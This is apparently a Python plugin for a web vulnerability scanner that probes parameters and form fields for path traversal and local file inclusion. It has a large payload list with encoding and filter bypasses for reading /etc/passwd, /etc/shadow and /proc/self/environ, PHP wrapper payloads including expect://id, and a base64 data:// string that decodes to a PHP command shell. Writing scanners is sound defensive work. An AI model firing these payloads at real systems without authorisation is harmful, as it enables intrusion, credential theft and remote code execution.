"""Path Traversal / Local File Inclusion detection plugin - Enhanced version."""

import re
from typing import List, Optional, Tuple
from uuid import uuid4
from urllib.parse import quote
from app.plugins.base import BaseDetector
from app.models.scan import DiscoveredEndpoint, Vulnerability, SeverityLevel, OWASPCategory
from app.services.http_client import HttpClient


# Comprehensive path traversal payloads
PATH_PAYLOADS = {
    # Basic traversal - Unix
    "unix_basic": [
        ("../../../etc/passwd", "basic_3"),
        ("../../../../etc/passwd", "basic_4"),
        ("../../../../../etc/passwd", "basic_5"),
        ("../../../../../../etc/passwd", "basic_6"),
        ("../../../../../../../etc/passwd", "basic_7"),
        ("../../../etc/shadow", "shadow"),
        ("../../../etc/hosts", "hosts"),
        ("../../../proc/self/environ", "proc_environ"),
        ("../../../proc/self/cmdline", "proc_cmdline"),
    ],
    # Basic traversal - Windows
    "windows_basic": [
        ("..\\..\\..\\windows\\win.ini", "win_ini"),
        ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "win_hosts"),
        ("..\\..\\..\\boot.ini", "boot_ini"),
        ("....\\....\\....\\windows\\win.ini", "double_dot_win"),
    ],
    # Encoding bypass - URL encoding
    "url_encoded": [
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "url_encoded"),
        ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "partial_encoded"),
        ("..%2f..%2f..%2fetc%2fpasswd", "slash_encoded"),
        ("%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "backslash_encoded"),
        ("%252e%252e%252f%252e%252e%252fetc/passwd", "double_encoded"),
    ],
    # Encoding bypass - Unicode/special
    "unicode": [
        ("..%c0%af..%c0%af..%c0%afetc/passwd", "overlong_utf8"),
        ("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "fullwidth_slash"),
        ("..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini", "overlong_backslash"),
    ],
    # Null byte injection (older systems)
    "null_byte": [
        ("../../../etc/passwd%00", "null_terminate"),
        ("../../../etc/passwd%00.jpg", "null_extension"),
        ("../../../etc/passwd%00.png", "null_png"),
        ("../../../etc/passwd\x00", "null_raw"),
    ],
    # Filter bypass techniques
    "bypass": [
        ("....//....//....//etc/passwd", "double_dot_slash"),
        ("..../..../..../etc/passwd", "quad_dot"),
        ("....\\\\....\\\\....\\\\windows\\\\win.ini", "double_backslash"),
        ("..././..././..././etc/passwd", "dot_slash_dot"),
        ("/..../..../..../etc/passwd", "leading_slash"),
        (".//..//.//..//etc/passwd", "mixed_slashes"),
        ("..;/..;/..;/etc/passwd", "semicolon"),
        ("/var/www/../../etc/passwd", "absolute_relative"),
    ],
    # Wrapper/protocol based
    "wrappers": [
        ("file:///etc/passwd", "file_protocol"),
        ("php://filter/convert.base64-encode/resource=../../../etc/passwd", "php_filter"),
        ("php://input", "php_input"),
        ("expect://id", "expect_wrapper"),
        ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "data_wrapper"),
    ],
}

# File-like parameter names
FILE_PARAMS = [
    "file", "path", "doc", "document", "page", "template", "include", 
    "filename", "filepath", "name", "load", "read", "download", "content",
    "dir", "folder", "root", "pg", "style", "pdf", "img", "image",
    "cat", "action", "board", "date", "detail", "item", "module",
]

# Indicators of successful file read
FILE_INDICATORS = {
    "unix_passwd": [
        "root:x:0:0:", "root:*:0:0:", "daemon:x:", "bin:x:",
        "nobody:x:", "www-data:", "mysql:x:", "postgres:x:",
    ],
    "unix_shadow": [
        "root:$", "root:!", "daemon:*:",
    ],
    "unix_hosts": [
        "127.0.0.1", "localhost", "::1",
    ],
    "unix_proc": [
        "PATH=", "HOME=", "USER=", "SHELL=", "PWD=",
    ],
    "windows": [
        "[extensions]", "[mci extensions]", "[fonts]", "[files]",
        "; for 16-bit app support", "[boot loader]", "[operating systems]",
    ],
    # Error patterns that suggest path manipulation worked
    "errors": [
        "failed to open stream", "include_path", "no such file or directory",
        "file_get_contents", "fopen", "include(", "require(",
        "warning: file", "not found in", "does not exist",
        "permission denied", "access denied",
    ],
}


class PathTraversalDetector(BaseDetector):
    """Enhanced Path Traversal / Local File Inclusion detector."""

    name = "Path Traversal Detector"
    description = "Detects LFI with encoding bypasses, wrappers, and null byte injection"

    async def detect(
        self,
        endpoint: DiscoveredEndpoint,
        http_client: HttpClient,
    ) -> List[Vulnerability]:
        vulnerabilities = []
        
        # Find file-like parameters
        file_params = self._find_file_params(endpoint.parameters)
        
        for param in file_params:
            vuln = await self._test_parameter(endpoint, param, http_client)
            if vuln:
                vulnerabilities.append(vuln)
        
        # Test form inputs
        for form in endpoint.forms:
            for inp in form.get("inputs", []):
                input_name = inp.get("name", "").lower()
                if any(fp in input_name for fp in FILE_PARAMS):
                    vuln = await self._test_form_input(endpoint, form, inp, http_client)
                    if vuln:
                        vulnerabilities.append(vuln)
        
        return vulnerabilities

    def _find_file_params(self, parameters: List[str]) -> List[str]:
        """Find parameters that might accept file paths."""
        found = []
        for param in parameters:
            param_lower = param.lower()
            if any(fp in param_lower for fp in FILE_PARAMS):
                found.append(param)
        return found if found else parameters[:2]  # Test first 2 if none found

    async def _test_parameter(
        self,
        endpoint: DiscoveredEndpoint,
        param: str,
        http_client: HttpClient,
    ) -> Optional[Vulnerability]:
        # Get baseline response for comparison
        try:
            baseline = await http_client.get(endpoint.url, params={param: "test.txt"})
            baseline_length = len(baseline.text)
        except Exception:
            baseline_length = 0

        # Test payloads by category
        for category, payloads in PATH_PAYLOADS.items():
            for payload, payload_type in payloads:
                try:
                    response = await http_client.get(
                        endpoint.url,
                        params={param: payload}
                    )
                    
                    result = self._analyze_response(response.text, category, baseline_length)
                    if result:
                        indicator_type, evidence = result
                        
                        return Vulnerability(
                            id=str(uuid4()),
                            name=f"Path Traversal ({payload_type})",
                            severity=SeverityLevel.HIGH if indicator_type != "errors" else SeverityLevel.MEDIUM,
                            owasp_category=OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
                            endpoint=endpoint.url,
                            method="GET",
                            parameter=param,
                            evidence=evidence,
                            description=self._get_description(category, param, indicator_type),
                            remediation=self._get_remediation(category),
                            confidence=0.90 if indicator_type != "errors" else 0.70,
                            detector_name=self.name,
                            raw_request=f"GET {endpoint.url}?{param}={quote(payload)}",
                        )
                except Exception:
                    continue
        
        return None

    async def _test_form_input(
        self,
        endpoint: DiscoveredEndpoint,
        form: dict,
        inp: dict,
        http_client: HttpClient,
    ) -> Optional[Vulnerability]:
        input_name = inp.get("name")
        if not input_name:
            return None

        # Test limited payloads for forms
        test_payloads = [
            ("../../../etc/passwd", "unix_basic", "basic_form"),
            ("..\\..\\..\\windows\\win.ini", "windows_basic", "windows_form"),
            ("....//....//....//etc/passwd", "bypass", "bypass_form"),
        ]
        
        for payload, category, payload_type in test_payloads:
            try:
                data = {input_name: payload}
                response = await http_client.post(form["action"], data=data)
                
                result = self._analyze_response(response.text, category, 0)
                if result:
                    indicator_type, evidence = result
                    return Vulnerability(
                        id=str(uuid4()),
                        name=f"Path Traversal in Form ({payload_type})",
                        severity=SeverityLevel.HIGH,
                        owasp_category=OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
                        endpoint=form["action"],
                        method="POST",
                        parameter=input_name,
                        evidence=evidence,
                        description=f"Path traversal in form field '{input_name}'",
                        remediation="Validate file paths and use allowlists",
                        confidence=0.85,
                        detector_name=self.name,
                    )
            except Exception:
                continue
        
        return None

    def _analyze_response(
        self, 
        response_text: str, 
        category: str,
        baseline_length: int
    ) -> Optional[Tuple[str, str]]:
        """Analyze response for path traversal indicators."""
        lower_text = response_text.lower()
        
        # Check for file content indicators
        for indicator_type, patterns in FILE_INDICATORS.items():
            if indicator_type == "errors":
                continue  # Check errors last
            for pattern in patterns:
                if pattern.lower() in lower_text:
                    return (indicator_type, f"File content exposed: {pattern}")
        
        # Check for error patterns (weaker signal)
        for pattern in FILE_INDICATORS["errors"]:
            if pattern.lower() in lower_text:
                # Additional check: response should be different from baseline
                if baseline_length == 0 or abs(len(response_text) - baseline_length) > 100:
                    return ("errors", f"File operation error: {pattern}")
        
        return None

    def _get_description(self, category: str, param: str, indicator_type: str) -> str:
        """Get detailed description."""
        base = f"Path Traversal vulnerability in parameter '{param}'. "
        
        if indicator_type in ["unix_passwd", "unix_shadow", "unix_proc"]:
            return base + "System files can be read, potentially exposing user accounts and configuration."
        elif indicator_type == "windows":
            return base + "Windows system files can be accessed, revealing system configuration."
        elif category == "wrappers":
            return base + "PHP wrappers or file protocols are processed, enabling advanced file read or RCE."
        elif indicator_type == "errors":
            return base + "File operation errors suggest the parameter is used in file operations."
        else:
            return base + "Directory traversal sequences can escape the intended directory."

    def _get_remediation(self, category: str) -> str:
        """Get remediation advice."""
        base = "Use a whitelist of allowed files. Never use user input directly in file paths. "
        
        if category == "wrappers":
            return base + "Disable dangerous PHP wrappers (allow_url_include=off). Block file:// protocol."
        elif category == "null_byte":
            return base + "Update to PHP 5.3.4+ which fixed null byte issues. Use realpath() to validate."
        elif category in ["url_encoded", "unicode"]:
            return base + "Decode and validate input before processing. Use canonicalization."
        else:
            return base + "Validate with realpath() and ensure result is within allowed directory."
